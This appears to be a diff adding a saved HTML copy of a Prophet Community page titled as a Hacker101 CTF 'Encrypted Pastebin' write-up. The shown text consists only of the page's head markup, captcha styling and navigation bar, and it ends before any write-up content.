@@ -1,0 +1,811 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <title>Hacker101 CTF Encrypted Pastebin write-up - Prophet Community</title>
+    <meta name="description" content="先知社区，先知安全技术社区">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    <link rel="icon" href="https://xz.aliyun.com/static/icon/favicon.ico" type="image/x-icon">
+    <link href="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/bootstrap.css" rel="stylesheet">
+    <link rel="stylesheet" href="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/editormd_002.css">
+    <link rel="stylesheet" href="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/tango.css">
+    <link href="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/bootstrap-responsive.css" rel="stylesheet">
+    <!-- Le styles -->
+    <link rel="stylesheet" href="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/OverlayStyle.css">
+    <link rel="stylesheet" href="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/topic.css">
+    <link rel="stylesheet" href="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/beautify.css">
+    
+    <link rel="stylesheet" href="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/editormd.css">
+    <link rel="stylesheet" href="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/tango.css">
+    <link rel="stylesheet" href="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/jquery.css">
+
+    <script src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/antidomxss_v640.js"></script><script src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/interfaceacting210923.js"></script><!--[if lte IE 8]>
+        <script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
+    <![endif]-->
+    
+    
+
+    <!--[if !IE]> -->
+    <script type="text/javascript" src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/jquery-2.js"></script>
+    
+    
+    <script src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/jquery_002.js"></script>
+
+    <!-- <![endif]-->
+<style type="text/css">#waf_nc_block {position: fixed;_position: absolute;width: 100%;height: 100%;top: 0;bottom: 0;left: 0;z-index: 99999;}.waf-nc-mask {background: #f8f8f8;opacity: 0.5;filter:alpha(opacity=50); width: 100%;height: 100%;} .waf-nc-wrapper {width:480px; height:254px; position: absolute; top: 50%; left: 50%; margin-top: -127px; margin-left: -240px; margin-bottom: 16px; background:#ffffff; border:3px solid #00A2CA;} .waf-nc-icon {position: absolute;top: 60px;left: 20px;} .waf-nc-title {margin-top: 23px; margin-left: 47px; font-size:16px; color:#333333; line-height:10px; text-align:left;} .waf-nc-splitter {margin-left: 26px; margin-top: 5px; width:430px; height:0px; border:1px solid #f4f4f4; } .waf-nc-description { margin-top: 70px; margin-left: 170px; font-size:12px; color:#333333; text-align: left; } #nocaptcha { margin-top: 40px; margin-left: 150px; width:300px; height36px;}</style><script src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/nc.js"></script><style>@charset "utf-8";
+@font-face{font-family:'nc_iconfont';src:url("//at.alicdn.com/t/font_1465353706_4784257.eot");src:url("//at.alicdn.com/t/font_1465353706_4784257.eot?#iefix") format('embedded-opentype'),url("//at.alicdn.com/t/font_1465353706_4784257.woff") format('woff'),url("//at.alicdn.com/t/font_1465353706_4784257.ttf") format('truetype'),url("//at.alicdn.com/t/font_1465353706_4784257.svg#iconfont") format('svg')}@font-face{font-family:'ncpc_iconfont';src:url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.eot");src:url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.eot?#iefix") format('embedded-opentype'),url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.woff") format('woff'),url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.ttf") format('truetype'),url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.svg#ncpc_iconfont") format('svg')}.nc-container div#nc-loading-circle{background:transparent;width:20px;height:20px;display:inline-block;position:relative;vertical-align:middle}.nc-container div#nc-loading-circle .sk-circle{background:transparent;width:100%;height:100%;position:absolute;left:0;top:0}.nc-container #nc-loading-circle .sk-circle:before{content:'';display:block;margin:0 auto;width:15%;height:15%;background-color:#818181;border-radius:100%;-webkit-animation:sk-circleFadeDelay 1.2s infinite ease-in-out both;animation:sk-circleFadeDelay 1.2s infinite ease-in-out both}.nc-container #nc-loading-circle .sk-circle2{-webkit-transform:rotate(30deg);-ms-transform:rotate(30deg);transform:rotate(30deg)}.nc-container #nc-loading-circle .sk-circle3{-webkit-transform:rotate(60deg);-ms-transform:rotate(60deg);transform:rotate(60deg)}.nc-container #nc-loading-circle .sk-circle4{-webkit-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg)}.nc-container #nc-loading-circle .sk-circle5{-webkit-transform:rotate(120deg);-ms-transform:rotate(120deg);transform:rotate(120deg)}.nc-container #nc-loading-circle .sk-circle6{-webkit-transform:rotate(150deg);-ms-transform:rotate(150deg);transform:rotate(150deg)}.nc-container #nc-loading-circle .sk-circle7{-webkit-transform:rotate(180deg);-ms-transform:rotate(180deg);transform:rotate(180deg)}.nc-container #nc-loading-circle .sk-circle8{-webkit-transform:rotate(210deg);-ms-transform:rotate(210deg);transform:rotate(210deg)}.nc-container #nc-loading-circle .sk-circle9{-webkit-transform:rotate(240deg);-ms-transform:rotate(240deg);transform:rotate(240deg)}.nc-container #nc-loading-circle .sk-circle10{-webkit-transform:rotate(270deg);-ms-transform:rotate(270deg);transform:rotate(270deg)}.nc-container #nc-loading-circle .sk-circle11{-webkit-transform:rotate(300deg);-ms-transform:rotate(300deg);transform:rotate(300deg)}.nc-container #nc-loading-circle .sk-circle12{-webkit-transform:rotate(330deg);-ms-transform:rotate(330deg);transform:rotate(330deg)}.nc-container #nc-loading-circle .sk-circle2:before{-webkit-animation-delay:-1.1s;animation-delay:-1.1s}.nc-container #nc-loading-circle .sk-circle3:before{-webkit-animation-delay:-1s;animation-delay:-1s}.nc-container #nc-loading-circle .sk-circle4:before{-webkit-animation-delay:-.9s;animation-delay:-.9s}.nc-container #nc-loading-circle .sk-circle5:before{-webkit-animation-delay:-.8s;animation-delay:-.8s}.nc-container #nc-loading-circle .sk-circle6:before{-webkit-animation-delay:-.7s;animation-delay:-.7s}.nc-container #nc-loading-circle .sk-circle7:before{-webkit-animation-delay:-.6s;animation-delay:-.6s}.nc-container #nc-loading-circle .sk-circle8:before{-webkit-animation-delay:-.5s;animation-delay:-.5s}.nc-container #nc-loading-circle .sk-circle9:before{-webkit-animation-delay:-.4s;animation-delay:-.4s}.nc-container #nc-loading-circle .sk-circle10:before{-webkit-animation-delay:-.3s;animation-delay:-.3s}.nc-container #nc-loading-circle .sk-circle11:before{-webkit-animation-delay:-.2s;animation-delay:-.2s}.nc-container #nc-loading-circle .sk-circle12:before{-webkit-animation-delay:-.1s;animation-delay:-.1s}@-webkit-keyframes sk-circleFadeDelay{0%,39%,100%{opacity:0}40%{opacity:1}}@-webkit-keyframes sk-circleFadeDelay{0%,39%,100%{opacity:0}40%{opacity:1}}@keyframes sk-circleFadeDelay{0%,39%,100%{opacity:0}40%{opacity:1}}.nc-container .scale_text2 #nc-loading-circle .sk-circle:before{background-color:#fff}.nc_iconfont{font-family:"nc_iconfont";color:#ff3f08;font-size:16px;font-style:normal}.ncpc_iconfont{font-family:"ncpc_iconfont";color:#ff3f08;font-size:16px;font-style:normal}.captcha-error .icon_ban{float:left;font-size:16px;padding-right:5px;line-height:14px}.clickCaptcha_text .btn_refresh{font-style:normal;cursor:pointer;background:#fff;color:#737383}.imgCaptcha .btn_refresh{font-size:20px;cursor:pointer;background:#fff;color:#737383}.nc_voice{display:none;position:relative;margin-top:-34px;z-index:99;width:auto;height:34px;background:#fff}.omeo-code-img,.omeo-code-audio{font-size:0;text-align:left}.omeo-code-audiobox,.omeo-code-img a,.omeo-code-audio a,.omeo-code-state{display:inline-block;*display:inline;zoom:1;height:32px;vertical-align:top;font-size:12px}.omeo-code .omeo-code-refresh{background:transparent;width:32px;height:32px;font-size:20px;color:#888;text-align:center;text-decoration:none;padding-left:4px;line-height:32px}.omeo-code .omeo-switch{display:none;width:32px;height:32px;border-left:1px solid #e1e1e1;background-image:url("//g.alicdn.com/sd/ncpc/images/checkcode.png");background-repeat:no-repeat}.omeo-img-active .omeo-code-img{display:block}.omeo-img-active .omeo-code-audio{display:none}.omeo-code-img img{border:1px solid #cdcdcd;cursor:pointer}.omeo-code-img .omeo-switch{background-position:9px -41px}.omeo-audio-active .omeo-code-audio{display:block}.omeo-audio-active .omeo-code-img{display:none}.omeo-code-refresh{position:relative;left:95px}.omeo-code-audiobox{position:relative;height:30px;line-height:32px;border:1px solid #e1e1e1;text-align:center;overflow:hidden;left:100px;top:1px;width:45%;min-width:80px;background-color:#eee}.omeo-code-audiobox a{display:block;text-decoration:none;color:#06c}.omeo-code-audiobox-playing a{visibility:hidden}.omeo-code-audiobox span,.omeo-code-audiobox b{visibility:hidden;position:absolute;top:0;left:0;height:30px;font-weight:100;overflow:hidden}.omeo-code-audiobox-playing span,.omeo-code-audiobox-playing b{visibility:visible}.omeo-code-audiobox span{z-index:0;width:0;background:#186bca}.omeo-code-audiobox b{width:100%;z-index:1;text-align:left;text-indent:30px;color:#999;background:url("//g.alicdn.com/sd/ncpc/images/checkcode.png") no-repeat 14px -89px}.omeo-code-audio .omeo-switch{background-position:5px 10px}input[type=text]::-ms-clear{display:none}.omeo-box{position:relative;background-color:#fff}.omeo-code-echo{position:absolute;top:2px;left:2px}.omeo-code-echo input{padding:5px;height:18px;line-height:18px;border:1px solid #ddd;width:80px;outline:0}.omeo-code-state{height:30px;line-height:30px;text-indent:25px;white-space:nowrap;background-image:url("//g.alicdn.com/sd/ncpc/images/checkcode.png");background-repeat:no-repeat;background-position:100px 100px}.omeo-code-echo .omeo-code-state-error{width:auto;background-position:7px -193px}.omeo-code-echo .omeo-code-state-success{position:absolute;width:30px;background-position:7px -243px}.omeo-code-state{position:absolute;left:0;top:28px}.nc_voice_close{display:inline-block;position:relative;cursor:pointer;left:95px;top:0;border-left:#ddd 2px solid;padding:0 0 0 7px;background-color:#fff;font-size:20px;color:#888;line-height:32px}.nc_help{position:absolute;width:100%;height:100%;left:0;top:0;z-index:99999}.nc_help .mask{background-color:#000;opacity:.5;filter:alpha(opacity=50);width:100%;height:100%;top:0;left:0}.nc_btn_close{position:absolute;height:20px;left:500px;border-radius:20px;padding:10px 30px;background-color:#aaa;color:#fff;cursor:pointer;z-index:10}.nc_btn_close:hover{background-color:#afafaf}.nc_hand{position:absolute;width:68px;height:53px;background-image:url("//g.alicdn.com/sd/ncpc/images/hand.png");z-index:3}.nc_slide_bg{z-index:3;font-size:12px;text-align:center;color:#fff;line-height:34px}.nc_voicebtn{position:absolute;padding:0;right:-25px;font-size:23px;color:#888;cursor:pointer;line-height:34px}.nc_helpbtn{position:absolute;cursor:pointer;right:-95px;top:4px;font-size:12px;background-color:#ffb668;color:#fff;padding:4px;border-radius:2px;line-height:18px;display:none}.nc_helpbtn:before{width:0;height:0;content:"";position:absolute;left:-2px;top:6px;border-top:4px solid transparent;border-bottom:4px solid transparent;border-right:4px solid #ffb668}.nc-container .errloading{border:#faf1d5 1px solid;text-indent:3px;background-image:none;font-size:12px;width:290px;line-height:20px;padding:7px 5px 8px 5px;color:#ef9f06;}.nc-container .errloading a{color:#30a7fc}.nc_captcha_text .nc_err{float:left;text-indent:0}.button_move{transition:left .5s;-moz-transition:left .5s;-webkit-transition:left .5s;-o-transition:left .5s}.bg_move{transition:width .5s;-moz-transition:width .5s;-webkit-transition:width .5s;-o-transition:width .5s}.nc_slide_box{position:absolute}.nc_captcha_text{height:auto;line-height:20px;visibility:hidden;font-size:12px;color:#999;font-weight:normal}.nc-container .nc_captcha_img_text{width:auto;height:auto;line-height:20px;visibility:hidden;font-size:12px;color:#999;font-weight:normal;display:none;padding:0 0 10px 0;background-position:0 0;}.nc-container .nc_captcha_img_text span.nc-lang-cnt{line-height:inherit}.nc-container .imgCaptcha .nc_captcha_img_text{width:auto}.nc_captcha_img_text{height:auto;line-height:20px;visibility:hidden;font-size:12px;color:#999;font-weight:normal;display:none;padding:0 0 10px 3px;background-position:0 0}.nc-container .nc_wrapper{width:auto}.nc_scale{width:auto;height:34px;background:#e8e8e8;position:relative;margin:0;padding:0}.nc_scale.is_audio{margin-right:25px}.nc-container .nc_scale div{height:auto}.nc-container .nc_scale ul{list-style:none}.nc-container .nc_scale .btn_slide{color:#737383;background-image:none;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.nc-container .nc_scale span{text-align:center;width:40px;height:32px;line-height:32px;border:1px solid #ccc;position:absolute;left:0;cursor:move;background:#fff;z-index:2}.nc-container .nc_scale span.nc-lang-cnt{*line-height:34px;float:none;width:auto;height:auto;*height:34px;border:none;position:static;cursor:inherit;background:none;z-index:0;display:inline}.nc_slide_button{width:40px;height:32px;border:1px solid #ccc;position:absolute;left:0;cursor:move;background:#fff url("//g.alicdn.com/sd/ncpc/images/rt.png") no-repeat center;z-index:2}@media screen and (-ms-high-contrast:active),(-ms-high-contrast:none){.nc_scale span{height:32px}}.nc-container .nc_scale .btnok{cursor:default;background:#fff url("//g.alicdn.com/sd/ncpc/images/yes.png") no-repeat center;z-index:3}.nc-container .nc_scale .btnok2{cursor:default;font-size:20px;background:#fff url("//g.alicdn.com/sd/ncpc/images/no.png") no-repeat center;z-index:3}.nc-container .nc_scale .btn_warn{cursor:default;color:#ff3f08;line-height:34px;text-align:center;font-size:20px;background:#fff;z-index:3}.nc-container .clickCaptcha_text .btn_refresh{font-size:20px}.nc-container .clickCaptcha_text .icon_close{line-height:30px;margin-left:8px;cursor:default;color:#ff3f08;font-size:16px;float:left;margin-right:2px;background:transparent;z-index:3}.nc-container .nc_captcha_img_text .icon_close{cursor:default;color:#ff3f08;font-size:16px;float:left;margin-right:4px;background:transparent;z-index:3;line-height:18px}.nc-container .errloading .icon_warn{cursor:default;color:#ff3f08;font-size:18px;float:left;background:transparent;z-index:3}.nc-container .nc_scale .btn_ok{cursor:default;line-height:34px;text-align:center;font-size:20px;background:#fff;z-index:3;color:#76c61d}.nc-container .nc_scale .nc_ok,.nc-container .nc_scale .nc_bg{background:#7ac23c}.nc-container .nc_scale .nc_bg{position:absolute;height:100%;_height:34px;left:0;width:10px}.nc-container .nc_scale div.redbar{background:#fc461e;opacity:.5;filter:alpha(opacity=50)}.nc-container .nc_scale div.orange{background:#f00}.nc-container .nc_scale .scale_text{width:100%;height:100%;text-align:center;position:absolute;z-index:1;background:transparent;color:#9c9c9c;line-height:34px;font-size:12px;cursor:pointer}.nc-container .nc_scale .scale_text2{text-align:left;color:#fff;font-size:12px;text-indent:10px}.nc-container .nc_scale .scale_text2 b{padding-left:0;font-weight:normal}.nc-container .nc_scale .scale_text.scale_loading_text{text-align:center}.nc-container .nc_scale .imgCaptcha,.nc-container .nc_scale .clickCaptcha{display:none;overflow:hidden;border:1px solid #ccc;background:#fff;z-index:20000;}.nc-container .nc_scale .imgCaptcha p.error span,.nc-container .nc_scale .clickCaptcha p.error span{line-height:normal}.nc-container .nc_scale .imgCaptcha{height:auto}.nc-container .nc_scale .clickCaptcha{position:absolute;left:0;top:35px;height:270px;background:#fff;display:none;}.nc-container .nc_scale .clickCaptcha p.error i{color:#ff3f08;font-style:normal}.nc-container .nc_scale .clickCaptcha div{position:static;clear:both;width:100%;background:#fff;height:auto}.nc-container .nc_scale .clickCaptcha .clickCaptcha_text{height:30px;line-height:30px;font-size:12px;color:#999;}.nc-container .nc_scale .clickCaptcha .clickCaptcha_text b{font-weight:normal}.nc_btn_2{position:absolute;right:0;top:0;cursor:pointer;margin:2px 9px 0 0}.nc_iconfont.nc_btn_2{position:absolute;right:0;top:0;cursor:pointer}.nc_iconfont.nc_btn_1{position:absolute;top:10px;right:5px}.nc_btn_1{top:10px;right:10px}.scale_text i{font-style:normal;border:none;position:static;cursor:default;color:#fffc00;background:none;display:inline;width:100%}.nc-container .clickCaptcha .clickCaptcha_img{margin:0 auto;clear:both;position:relative;}.nc-container .clickCaptcha .clickCaptcha_img img{width:230px;height:230px;margin-left:10px;margin-top:5px}.nc-container .clickCaptcha .clickCaptcha_btn{margin:10px 0 0 15px;position:relative;text-align:left;}.nc-container .clickCaptcha .clickCaptcha_btn img{cursor:pointer}.nc-container .imgCaptcha{position:absolute;left:0;top:35px;height:auto;padding-bottom:15px;border:1px solid #ccc;background:#fff;}.nc-container .imgCaptcha div{position:static;width:90%;background-color:#fff}.nc-container .imgCaptcha,.nc-container .clickCaptcha{text-align:left;}.nc-container .imgCaptcha a,.nc-container .clickCaptcha a{color:#ff3f08}.nc-container .imgCaptcha .imgCaptcha_text{height:42px;line-height:42px;width:120px;background:#fff;font-size:14px;text-align:left;color:#747474;float:left;margin-left:10px;}.nc-container .imgCaptcha .imgCaptcha_text input{margin-top:5px;height:30px;line-height:30px;font-size:14px;width:90px;background:#fff}.nc-container .imgCaptcha .imgCaptcha_text input:focus{outline:none;color:#bbb}.nc-container .imgCaptcha .imgCaptcha_btn{margin:0 0 0 12px;*margin-left:0;clear:both;padding-top:5px;width:90%;}.nc-container .imgCaptcha .imgCaptcha_btn img{cursor:pointer}.nc-container .imgCaptcha .nc_scale_submit{margin:0 auto;cursor:pointer;background-color:#fc461e;width:120px;height:32px;line-height:32px;color:#fff;text-align:center}.nc-container .imgCaptcha .imgCaptcha_img{margin:4px 0 0 100px;height:40px;width:130px;overflow:hidden;cursor:pointer;}.nc-container .imgCaptcha .imgCaptcha_img img{width:130px}.nc-container .imgCaptcha .imgCaptcha_img input{border:solid 1px #ccc}.nc-lang-ar_MA,.nc-lang-ar_SA,.nc-lang-iw_HE,.nc-lang-iw_IL{text-align:right;*text-align:left;}.nc-lang-ar_MA .nc_scale .scale_text2,.nc-lang-ar_SA .nc_scale .scale_text2,.nc-lang-iw_HE .nc_scale .scale_text2,.nc-lang-iw_IL .nc_scale .scale_text2{text-align:right;}.nc-lang-ar_MA .nc_scale .scale_text2 span,.nc-lang-ar_SA .nc_scale .scale_text2 span,.nc-lang-iw_HE .nc_scale .scale_text2 span,.nc-lang-iw_IL .nc_scale .scale_text2 span{*display:inline-block;padding:0 56px 0 0}.nc-lang-ar_MA .nc_captcha_img_text,.nc-lang-ar_SA .nc_captcha_img_text,.nc-lang-iw_HE .nc_captcha_img_text,.nc-lang-iw_IL .nc_captcha_img_text{*text-align:right}.nc-lang-ar_MA span.nc-lang-cnt,.nc-lang-ar_SA span.nc-lang-cnt,.nc-lang-iw_HE span.nc-lang-cnt,.nc-lang-iw_IL span.nc-lang-cnt{text-align:right;direction:rtl}.nocaptcha span.nc-lang-cnt{float:none;height:auto;line-height:30px}.nc-container{font-size:12px;-ms-touch-action:none;touch-action:none;}.nc-container p{margin:0;padding:0;display:inline}.nc-container .scale_text.scale_text span[data-nc-lang="_startTEXT"]{display:inline-block;width:100%}.nc-container .scale_text.scale_text.slidetounlock span[data-nc-lang="_startTEXT"]{background:-webkit-gradient(linear,left top,right top,color-stop(0,#4d4d4d),color-stop(.4,#4d4d4d),color-stop(.5,#fff),color-stop(.6,#4d4d4d),color-stop(1,#4d4d4d));-webkit-background-clip:text;-webkit-text-fill-color:transparent;-webkit-animation:slidetounlock 3s infinite;-webkit-text-size-adjust:none}.nc-container .nc_scale .nc-align-center.scale_text2{text-align:center;text-indent:-42px}@-webkit-keyframes slidetounlock{0%{background-position:-200px 0}100%{background-position:200px 0}}.nc-container.tb-login .clickCaptcha_text .icon_close{line-height:30px;margin-left:0;cursor:default;color:#ff3f08;font-size:16px;float:left;margin-right:0;background:transparent;z-index:3}.nc-container.tb-login{position:relative;margin-top:20px;display:none;}.nc-container.tb-login .nc_scale{width:auto;}.nc-container.tb-login .nc_scale .scale_text2{text-indent:-42px;text-align:center;}.nc-container.tb-login .nc_scale .scale_text2 b{padding:0}.nc-container.tb-login .nc_scale.nc_err div.scale_text{background:#f79977}.nc-container.tb-login .errloading{width:auto}.nc-container.tb-login .imgCaptcha,.nc-container.tb-login .clickCaptcha{width:252px;*width:256px;border:0;*height:300px;min-height:300px;max-height:inherit !important;}.nc-container.tb-login .imgCaptcha div.login-msg.error,.nc-container.tb-login .clickCaptcha div.login-msg.error{background:#fff2f2}.nc-container.tb-login .imgCaptcha .captcha-error,.nc-container.tb-login .clickCaptcha .captcha-error{position:absolute;top:0;width:244px;height:auto;margin-bottom:15px;padding:3px;border:solid 1px #ff8e8e;line-height:18px}.nc-container.tb-login .imgCaptcha .captcha-inform,.nc-container.tb-login .clickCaptcha .captcha-inform{font-size:110%;margin-left:20px}.nc-container.tb-login .imgCaptcha{padding-top:66px;}.nc-container.tb-login .imgCaptcha .imgCaptcha_text{width:100px;margin-left:0;}.nc-container.tb-login .imgCaptcha .imgCaptcha_text input:focus{color:#000}.nc-container.tb-login .imgCaptcha .imgCaptcha_img{width:120px;_width:100px}.nc-container.tb-login .imgCaptcha .imgCaptcha_btn{width:100%;margin-left:0}.nc-container.tb-login .imgCaptcha .nc_scale_submit{width:100%;height:36px;line-height:36px;margin-top:20px;margin-left:0;border-radius:3px;font-size:16px;font-family:Tahoma,Helvetica,Arial,sans-serif;background:#ff3f08}.nc-container.tb-login .clickCaptcha{padding-top:40px;}.nc-container.tb-login .clickCaptcha .clickCaptcha_text{text-indent:4px}.nc-container.tb-login .clickCaptcha .clickCaptcha_img img{margin-left:10px}.nc-container.tb-login .nc_btn_1{top:77px;_top:57px}.nc-container.tb-login .nc_btn_2{top:36px}.login .nc-container.tb-login .login-msg p,.login-box .nc-container.tb-login .login-msg p{width:auto;float:left}.nc-container.tb-login.nc-old-login{margin:20px 0 10px 0;width:250px;}.nc-container.tb-login.nc-old-login .nc_wrapper{width:250px}.nc-container.tb-login.nc-old-login .imgCaptcha,.nc-container.tb-login.nc-old-login .clickCaptcha{width:250px;min-height:auto;}.nc-container.tb-login.nc-old-login .imgCaptcha .captcha-error,.nc-container.tb-login.nc-old-login .clickCaptcha .captcha-error{line-height:16px}.nc-container.tb-login.nc-old-login .clickCaptcha{padding-top:28px;}.nc-container.tb-login.nc-old-login .clickCaptcha .clickCaptcha_img img{width:200px;height:200px}.nc-container.nc-old-login.show-click-captcha{padding-bottom:60px}.nc-container.nc-old-login.show-click-captcha.nc-tm-min-fix{padding-bottom:40px}.nc-container.tb-login.nc-tm-min-fix .clickCaptcha{max-height:340px !important}#content .login-box .bd .nc-container.tb-login .login-msg{margin:10px auto 15px auto}#content .login-box .bd .nc-container.tb-login.nc-old-login.show-click-captcha .login-msg{margin:2px 0 0 0}.nc-container .nc_scale .nc-cc{display:none;position:absolute;left:0;top:35px;z-index:20000;width:360px;height:570px;border:1px solid #5eaef1;border-radius:4px;background:#fff;font-size:14px;line-height:18px;color:#333;}.nc-container .nc_scale .nc-cc.nc-cc-status-loading .nc-cc-btn,.nc-container .nc_scale .nc-cc.nc-cc-status-verifing .nc-cc-btn{background-color:#90c1eb}.nc-container .nc_scale .nc-cc.nc-cc-status-loading .nc-cc-btn,.nc-container .nc_scale .nc-cc.nc-cc-status-verifing .nc-cc-btn,.nc-container .nc_scale .nc-cc.nc-cc-status-loading .nc-cc-refresh,.nc-container .nc_scale .nc-cc.nc-cc-status-verifing .nc-cc-refresh{cursor:default}.nc-container .nc_scale .nc-cc.nc-cc-status-loading .nc-cc-refresh,.nc-container .nc_scale .nc-cc.nc-cc-status-verifing .nc-cc-refresh{color:#999}.nc-container .nc_scale .nc-cc a{color:#3199f4;text-decoration:none}.nc-container .nc_scale .nc-cc .nc_iconfont{vertical-align:top;margin-right:8px}.nc-container .nc_scale .nc-cc-btn{display:inline-block;*display:inline;*zoom:1;vertical-align:top;letter-spacing:normal;word-spacing:normal;width:100px;line-height:30px;text-align:center;background-color:#3199f4;color:#fff;border-radius:4px;cursor:pointer;}.nc-container .nc_scale .nc-cc-btn.nc-cc-disabled{background-color:#90c1eb;cursor:default}.nc-container .nc_scale .nc-cc-btn .nc-lang-cnt{line-height:18px}.nc-container .nc_scale .nc-cc-header{padding:20px 20px 19px 20px;height:100px;background:#f4f8fa;border-bottom:1px solid #ccc}.nc-container .nc_scale .nc-cc-img1-box{float:left;width:100px;height:100px;margin-right:16px}.nc-container .nc_scale .nc-cc-txt{overflow:hidden;*zoom:1;line-height:30px;padding-top:11px}.nc-container .nc_scale .nc-cc-img2-box{position:relative;padding:0 20px;margin-top:20px}.nc-container .nc_scale .nc-cc-items{position:absolute;left:20px;_left:0;top:0;width:320px;overflow:hidden}.nc-container .nc_scale .nc-cc-items-inner{margin-right:-20px}.nc-container .nc_scale .nc-cc-item{position:relative;display:inline-block;*display:inline;*zoom:1;vertical-align:top;letter-spacing:normal;word-spacing:normal;margin-right:10px;margin-bottom:10px;border:1px solid #ccc;width:98px;height:98px;background:url("//gtms02.alicdn.com/tps/i2/T1ty2QFNNXXXc6Yc2r-1-1.gif");}.nc-container .nc_scale .nc-cc-item:hover{border-color:#3199f4}.nc-container .nc_scale .nc-cc-item .nc_iconfont{display:none;position:absolute;right:0;bottom:0;color:#3199f4;font-size:22px;margin-right:0}.nc-container .nc_scale .nc-cc-item.nc-cc-selected .nc_iconfont{display:block}.nc-container .nc_scale .nc-cc-tip{display:none;position:absolute;left:0;bottom:60px;width:360px;line-height:18px;text-align:center;color:#eb4f38;}.nc-container .nc_scale .nc-cc-tip span{line-height:normal}.nc-container .nc_scale .nc-cc-footer{position:absolute;left:0;bottom:20px;width:360px;height:30px;line-height:30px;text-align:center;}.nc-container .nc_scale .nc-cc-footer .nc_iconfont{color:#c4cbd0}.nc-container .nc_scale .nc-cc-refresh,.nc-container .nc_scale .nc-cc-wait{position:absolute;left:20px;top:0;color:#3199f4;cursor:pointer}.nc-container .nc_scale .nc-cc-wait{display:none}.nc-container .nc_scale .nc-cc-cancel{position:absolute;right:20px;top:0;color:#3199f4;cursor:pointer;}.nc-container .nc_scale .nc-cc-cancel .nc_iconfont{position:relative;top:-1px}.nc-container .nc_scale .nc-cc-loading{margin-top:247px;text-align:center;line-height:14px}.nc-container .nc_scale .nc-cc-loading-img{display:inline-block;*display:inline;*zoom:1;vertical-align:top;letter-spacing:normal;word-spacing:normal;vertical-align:middle;background:url("//img.alicdn.com/tps/TB1OdxsKpXXXXcgXFXXXXXXXXXX-14-14.gif") no-repeat;width:14px;height:14px;position:relative;top:-1px;margin-right:9px}.nc-container .nc_scale .nc-cc-fail{position:absolute;left:50%;top:50%;width:320px;height:180px;margin-left:-160px;margin-top:-90px;background:#fff;border-radius:4px}.nc-container .nc_scale .nc-cc-fail-inner{text-align:center;padding:55px 10px 10px}.nc-container .nc_scale .nc-cc-fail-action{margin:28px 0 18px;}.nc-container .nc_scale .nc-cc-fail-action a{display:inline-block;*display:inline;*zoom:1;vertical-align:top;letter-spacing:normal;word-spacing:normal;line-height:30px;margin-left:16px}.nc-container .nc_scale .nc-cc-contact{text-align:right;color:#666;padding-right:9px}.nc-container .nc_scale .nc-cc-mask{display:none;position:absolute;left:0;top:0;width:360px;height:570px;background:rgba(0,0,0,0.3);filter:progid:DXImageTransform.Microsoft.gradient(enabled='true',startColorstr='#4C000000', endColorstr='#4C000000');}:root .nc-container .nc_scale .nc-cc-mask{-webkit-filter:none;filter:none}.nc-container .nc_scale .nc-cc-arrow-1,.nc-container .nc_scale .nc-cc-arrow-2{display:none;position:absolute;top:340px;border:solid transparent;height:0;width:0}.nc-container .nc_scale .nc-cc-arrow-1{border-width:16px;margin-top:-1px}.nc-container .nc_scale .nc-cc-arrow-2{border-width:15px}.nc-container .nc_scale .nc-cc-right .nc-cc-arrow-1,.nc-container .nc_scale .nc-cc-left .nc-cc-arrow-1,.nc-container .nc_scale .nc-cc-right .nc-cc-arrow-2,.nc-container .nc_scale .nc-cc-left .nc-cc-arrow-2{display:block;_display:none}.nc-container .nc_scale .nc-cc-right{left:180px;top:-339px;}.nc-container .nc_scale .nc-cc-right .nc-cc-arrow-1{border-right-color:#5eaef1;left:-32px}.nc-container .nc_scale .nc-cc-right .nc-cc-arrow-2{border-right-color:#fff;left:-30px}.nc-container .nc_scale .nc-cc-left{left:-335px;top:-339px;}.nc-container .nc_scale .nc-cc-left .nc-cc-arrow-1{border-left-color:#5eaef1;right:-32px}.nc-container .nc_scale .nc-cc-left .nc-cc-arrow-2{border-left-color:#fff;right:-30px}</style></head>
+<body>
+<!-- navbar begin -->
+<div class="navbar navbar-default">
+    <div class="navbar-inner">
+        <div class="container" style="text-align: center; position:relative;">
+            <!--[if lte IE 8]>
+            <span style="display:inline-block;margin:0 auto;color:red;">为了更好的体验，请使用IE10及以上版本</span>
+            <![endif]-->
+            <div class="brand-box">
+                <a class="brand" href="https://xz.aliyun.com/"></a>
+            </div>
+            
+                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F7054&amp;from_type=xianzhi" class="pull-right anonymous-user hh_loding"><font style="vertical-align: inherit;">
+                    Log in </font></a>
+            
+            <div class="nav-collapse collapse">
+                <div class="search d1 text-right">
